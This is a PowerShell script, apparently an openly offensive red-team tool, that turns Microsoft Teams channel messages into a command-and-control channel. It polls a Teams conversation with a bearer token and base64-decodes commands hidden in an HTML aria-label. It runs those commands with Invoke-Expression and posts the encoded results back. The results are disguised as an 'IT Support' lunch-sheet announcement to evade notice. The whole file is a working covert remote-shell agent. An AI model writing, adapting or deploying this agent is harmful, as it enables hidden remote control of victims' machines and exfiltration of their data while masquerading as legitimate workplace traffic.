###########################################################################################################
#
# This project leverages the Microsoft Teams Channel API to achieve command and control (C&C)
# Version:    1.0.1
# Author :    @san6051
# Date   :    25 March 2025
#
###########################################################################################################

function Print-Banner{
Write-Output "#####                                               ####      ##        #####     ##                   ####      ####"
Write-Output " ###                                               ###        ##        ##        ##                    ###       ###"
Write-Output " ###       ####      ####     ######      ####     ##         #####     ###       #####      ####       ###       ###"
Write-Output " ###      ######       ##     # ## #     ###       ##         #####       ###     #####     ######      ###       ###"
Write-Output " ###      ###        ####     # ## #       ###     ###        ## ##        ##     ## ##     ###         ###       ###"
Write-Output " ###       ####     #####     # ## #     ####       ####      ## ##     #####     ## ##      ####      #####     #####"
Write-Output "                                                                                                          by @san6051 "
}

Print-Banner

function Teams-Output {
    param (
        [string]$cmd,
        [string]$token,
        [string]$conversationid
    )

    $CurrentTime=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    # Send data via Teams Channel
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    $s=Invoke-WebRequest -UseBasicParsing -Uri "https://teams.microsoft.com/api/chatsvc/apac/v1/users/ME/conversations/$conversationid/messages" `
    -Method "POST" `
    -WebSession $session `
    -Headers @{
      "authorization"="Bearer $token"
     } `
    -ContentType "application/json" `
    -Body "{`"id`":`"-1`",`"type`":`"Message`",`"conversationid`":`"$conversationid`",`"conversationLink`":`"blah/$conversationid`",`"composetime`":`"$CurrentTime`",`"originalarrivaltime`":`"$CurrentTime`",`"content`":`"<p aria-label='$cmd'>According to the Teams report as at $CurrentTime today, there are 244 staffs who has not submit Lunch Sheet.</p>`",`"messagetype`":`"RichText/Html`",`"contenttype`":`"Text`",`"imdisplayname`":`"IT Support`",`"callId`":`"`",`"state`":0,`"version`":`"0`",`"amsreferences`":[],`"properties`":{`"importance`":`"`",`"subject`":`"Important Announcement`",`"title`":`"`",`"cards`":`"[]`",`"links`":`"[]`",`"mentions`":`"[]`",`"onbehalfof`":null,`"files`":`"[]`",`"policyViolation`":null,`"formatVariant`":`"TEAMS`"},`"postType`":`"Standard`",`"crossPostChannels`":[]}"
}

function Teams-Input {
    param (
        [string]$token,
        [string]$conversationid
    )
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    $s=Invoke-WebRequest -UseBasicParsing -Uri "https://teams.microsoft.com/api/chatsvc/apac/v1/users/ME/conversations/$conversationid/messages" `
    -WebSession $session `
    -Headers @{
    "authorization"="Bearer $token"
    }
    $content = $s.Content | ConvertFrom-Json

    return @{
        sequenceId = (($s.Content | ConvertFrom-Json).messages)[0].sequenceId
        content = (($s.Content | ConvertFrom-Json).messages)[0].content
        StatusCode = $s.StatusCode
    }
}

function TeamsCh-Shell-Agent{
    param (
        [Parameter(Mandatory=$false)]
        [string]$time="60",
        [string]$token,
        [string]$Inputconversationid,
        [string]$Outputconversationid
    )
    $previoussequenceId = ""
    while ($true){

        $TeamInput = Teams-Input -token $token -conversationid $Inputconversationid

        # Check for any updated commands
        $sequenceId = $TeamInput.sequenceId
        if ($sequenceId -eq $previoussequenceId) {
            # Sleep 60
            Write-Output "No updated commands received."
            sleep $time
        }else{
            $previoussequenceId = $sequenceId
            if ($TeamInput.content -match 'aria-label="([^"]+)"') {
                $query=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
            }
            # Execute cmd
            $result = iex -Command $query -ErrorAction Stop -ErrorVariable e | Out-String;
            Write-Output "cmd: $query"
            Write-Output "Result: $result"
            $output = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result))
            Teams-Output -token $token -cmd $output -conversationid $Outputconversationid
            sleep $time
        }

    }
}
